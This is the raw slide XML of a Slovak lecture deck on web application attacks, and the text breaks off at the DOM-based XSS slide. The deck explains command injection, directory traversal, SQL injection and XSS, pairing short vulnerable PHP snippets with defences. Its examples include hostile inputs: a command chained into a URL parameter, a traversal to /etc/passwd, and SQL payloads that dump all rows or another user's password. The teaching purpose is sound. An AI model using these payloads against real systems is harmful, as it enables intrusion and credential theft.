          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-33020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600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" sz="1600" dirty="0"/>
              <a:t>Útoky na webové aplikácie</a:t>
            </a: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sz="1600" dirty="0"/>
              <a:t>Autentifikácia používateľov vo web aplikáciách</a:t>
            </a:r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2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4305617" y="3946722"/>
            <a:ext cx="4402500" cy="517200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>Agenda </a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p: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</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Webové útoky </a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp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122" name="Google Shape;122;p16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</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK"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942725" y="506650"/>
            <a:ext cx="78627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i="1"/>
              <a:t>"Security is not a solution; it is a way of life."</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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Problémy bezpečnosti – strana</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>klienta</a:t>
            </a:r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Bezpečnostné chyby v prehliadačoch + inštalácia neoverených doplnkov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Získanie kontroly nad počítačom používateľa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Zavírenie počítača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Podvrhnutie adresy servera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Odcudzenie citlivých dát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Inštalácia </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t>spyware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>softvéru</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a: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Riešenie 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Pravidelná inštalácia nových verzií prehliadačov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Vyhýbanie sa "pochybným" WWW serverom</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a: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Sťahovanie a spúšťanie len overených programov (rozšírenia prehliadačov a pod.)</a:t>
            </a:r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4</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0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F5B2092F-B7AD-3A28-F088-475A22B61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1763" y="2180574"/>
            <a:ext cx="2070387" cy="15464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Problémy bezpečnosti – strana</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>servera</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;p18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29949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Možné bezpečnostné problémy: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Zlé zabezpečenie servera (HW, OS, FW)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Chybné nastavenia v konfigurácii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Ignorovanie vydávaných opráv OS a iného SW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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zle naprogramovaný kód web aplikácie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Možné dôsledky útokov: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Získanie kontroly nad web serverom (vlastné skripty)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Pozmenenie súborov na serveri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Získanie prístupu k citlivým dátam (napr. dáta o zákazníkoch, čísla kreditných kariet,  hesiel, ...)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Odcudzenie zdrojových kódov skriptov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Útoky typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Denial of Service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p1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5</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Bezpečnosť internetových technológií</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;143;p19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657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Bezpečné technológie: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HTTP (je to len protokol)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HTML (nie je programovací jazyk)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CSS (nie je programovací jazyk)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i="1" dirty="0"/>
              <a:t>Cookies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Neobsahujú žiadny spustiteľný kód (ani nemôžu)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"Krádež" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>cookies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Podvrhnutie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>cookies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JavaScript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Obmedzené možnosti na strane klienta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Môže sa podieľať na krádeži dát</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Google Shape;144;p1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6</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Bezpečnosť kódu na strane servera</a:t>
            </a:r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Chyby zasahujú všetky technológie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PHP, ASP.NET, Java, ...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Niektoré najčastejšie typy chýb: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Neošetrovanie vstupných hodnôt z formulárov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Zlé nastavenia v konfigurácii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Zlé programátorské praktiky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/>
              <a:t>Podcenenie bezpečnosti (neznalosť, pohodlnosť)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p2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7</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Obrázok 2" descr="Obrázok, na ktorom je text, animák, animovaná rozprávka, snímka obrazovky&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BDB991D-B01D-917F-C216-F3476CADE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589" y="2242011"/>
            <a:ext cx="3306415" cy="2500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Najčastejčie typy web útokov</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Google Shape;157;p2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i="1" dirty="0"/>
              <a:t>OS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>injection</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i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i="1" dirty="0" err="1"/>
              <a:t>Directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>traversal</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i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i="1" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>injection</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i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i="1" dirty="0" err="1"/>
              <a:t>Cross</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> (XSS)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i="1" dirty="0" err="1"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1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i="1" dirty="0" err="1"/>
              <a:t>Cross</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> Site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>Forgery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> (CSRF)</a:t>
            </a:r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8</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>OS command injection</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p22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Skript spúšťajúci neškodný program na serveri:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US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en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="55779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27000" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1600"/>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="sk-SK" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="55779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lang="sk-SK" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="55779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Parameter v poriadku: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://abc.sk/cgi-bin/odozva?server=localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0"/>
              <a:t>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Zneužitie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://abc.sk/cgi-bin/odozva?server=localhost;ls%20-l</a:t>
            </a:r>
            <a:b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</a:b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Riešenie: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Kontrola vstupu od používateľa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Filtrovanie nebezpečných znakov –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escapeshellcmd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()</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;p2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9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8F8FBC-7E33-4976-A0FA-CE6F3667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247" y="2204607"/>
            <a:ext cx="2653290" cy="5539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ping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'server'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]); </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="0" lang="sk-SK" altLang="sk-SK" sz="1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BBDF43B-E4A5-4FC3-9A38-4117BF93E9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7542" y="3301498"/>
            <a:ext cx="1968809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ping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localhost</a:t>
            </a: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ls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-l</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Obrázok 3" descr="Obrázok, na ktorom je grafika, grafický dizajn, logo, dizajn&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ABCA38E-DBC0-E027-9FFF-B004D8F3B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15" y="1388620"/>
            <a:ext cx="3174935" cy="16668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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>Directory traversal</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Google Shape;171;p23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="1376142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Skript vypisujúci súbor z adresára</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:b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sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="557799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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Parameter v poriadku: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://abc.sk/cgi-bin/vypis?subor=abc.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0"/>
              <a:t>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Zneužitie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="14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http://abc.sk/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0" err="1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cgi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="14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-bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0" err="1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vypis?subor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="14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=../../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0" err="1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etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="14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sk-SK" sz="1400" u="sng" dirty="0" err="1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passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:b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en-US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en-US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Riešenie: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Nepovoliť čítanie súborov z iných adresárov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Kontrola vstupov od používateľa</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172" name="Google Shape;172;p2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10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2DE1E3-A74E-4E55-9CAE-AC2072C58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886" y="1852426"/>
            <a:ext cx="2653290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subor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fpassthru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ACE1CDDC-2248-4BAE-A45C-167C4FAB8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886" y="3257537"/>
            <a:ext cx="3005951" cy="70788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fp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fopen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sk-SK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../../</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="sk-SK" sz="1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etc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="sk-SK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/passwd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sk-SK" sz="1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...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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>SQL injection</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Google Shape;185;p2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Pozmenenie SQL dopytu tak, aby vrátil (zmenil) dáta, ktoré potrebuje útočník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Umožňuje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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Prihlásenie pod cudzím účtom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Neoprávnené získanie dát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Pozmenenie alebo vymazanie dát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Odstavenie DB servera – DoS útok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Spustenie systémových príkazov (za určitých okolností)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Google Shape;186;p2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11</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="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5B598F39-99FF-16D4-C308-1AC8587E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750" y="3014772"/>
            <a:ext cx="2705100" cy="1685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SQL injection – ukážka</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p26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1074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Prístup k databáze:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr lang="sk-SK" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="sk-SK" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333333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Parameter  v poriadku: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://abc.sk/cgi-bin/db.php?ID=1254</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0"/>
              <a:t>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Zneužitie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400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http://abc.sk/cgi-bin/db.php?ID=1254+or+id%3C%3E0</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>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Riešenie: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 err="1"/>
              <a:t>Parametrizované</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> dopyty (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>prepared statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="91440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sz="1200" dirty="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3" name="Google Shape;193;p2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12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98F0F6-FB8D-4F57-A5BE-0C7F0ACA4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333" y="2017752"/>
            <a:ext cx="4698722" cy="55399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sk-SK" altLang="sk-SK" sz="10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mysqli_query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"SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="sk-SK" altLang="sk-SK" sz="1000" b="0" i="1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FROM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zakaznici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 WHERE id="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$_GET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]);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?&gt;  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B0C333A-DA33-4655-826C-BE07124C67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333" y="3274898"/>
            <a:ext cx="4262705" cy="27699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ELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="sk-SK" altLang="sk-SK" sz="12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FROM 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zakaznici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WHERE id=</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US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1254 OR id&lt;&gt;0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  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Obrázok 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA7E71F6-B77B-043D-C3B0-C882B4E56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023" y="2203335"/>
            <a:ext cx="2143125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4A24ED-55E2-44BF-865B-0A796643B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Ukážka </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>vo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Va</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>ííčko</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FW</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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C1DCFD-1A4C-4E4F-A38C-C9D38EC00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Nesprávne použitie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>prepared statements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Umožní prihlásenie iným heslom </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Fero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, ale pod zvoleným </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>loginom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Peter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Modifikovaný SQL dopyt (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> používateľa):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="127000" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>     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xxx' UNION SELECT id, lo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g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in, (SELECT password FROM users WHERE login='</a:t>
            </a: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Fero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') AS password FROM users WHERE login='Peter</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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sk-SK" dirty="0"/>
              <a:t>Chybné použitie:</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1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127000" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    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User::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getAll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("login='{$_POST['login']}'")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Správne použitie:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="127000" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="sk-SK" sz="1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4645084-1B9A-4D91-B819-51B0F29D41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13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB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1653DD0-447E-4B2B-811A-CE4E5B08F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085" y="4060851"/>
            <a:ext cx="4517583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$user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sk-SK" altLang="sk-SK" sz="12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=?'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$_POST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login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]]);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776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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>Cross site scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>(XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Google Shape;206;p2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Útok pomocou JS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Často v kombinácii s CSRF útokom</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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3 typy útokov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Lokálny (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>based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Dočasný (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>non-persistent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>reflected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Trvalý (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>persistent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>stored</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>second-order</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Príklady: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" u="sng" dirty="0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3"/>
              </a:rPr>
              <a:t>http://cs.wikipedia.org/wiki/Cross-site_scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Cabin"/>
                <a:ea typeface="Cabin"/>
                <a:cs typeface="Cabin"/>
                <a:sym typeface="Cabin"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Cabin"/>
              <a:ea typeface="Cabin"/>
              <a:cs typeface="Cabin"/>
              <a:sym typeface="Cabin"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://xss.js.org</a:t>
            </a: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Obrana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Kontrola vstupov od používateľa a filtrovanie HTML značiek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 dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p2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14</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Obrázok 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1646BDF-14E4-07D6-BBEC-E2EF39AF7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175" y="1635370"/>
            <a:ext cx="2466975" cy="18478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XSS útok typu 1 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>DOM based</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="213" name="Google Shape;213;p29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Chybný skript:</a:t>
            </a:r>
            <a:br>
